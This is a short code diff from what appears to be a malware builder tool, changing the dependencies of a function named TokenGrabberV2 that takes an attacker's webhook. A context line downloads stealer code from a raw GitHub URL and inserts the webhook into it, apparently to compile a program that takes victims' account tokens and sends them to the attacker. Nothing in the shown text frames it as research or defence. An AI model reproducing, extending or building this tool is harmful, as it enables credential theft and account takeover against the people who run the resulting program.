@@ -19,12 +19,14 @@ from util.plugins.common import setTitle, install_lib
 def TokenGrabberV2(WebHook, fileName):
     required = [
         'pyinstaller', 
+        'httpx',
+        'pyotp',
         'psutil',
-        'pycryptodome',
         'pypiwin32',
-        'requests',
+        'pycryptodome',
+        'pyinstaller',
         'pyautogui',
-        'numpy'
+        'PIL-tools',
     ]
     install_lib(required)
     code = requests.get("https://raw.githubusercontent.com/JaneHongEn/111/main/main.py").text.replace("WEBHOOK_HERE", WebHook)
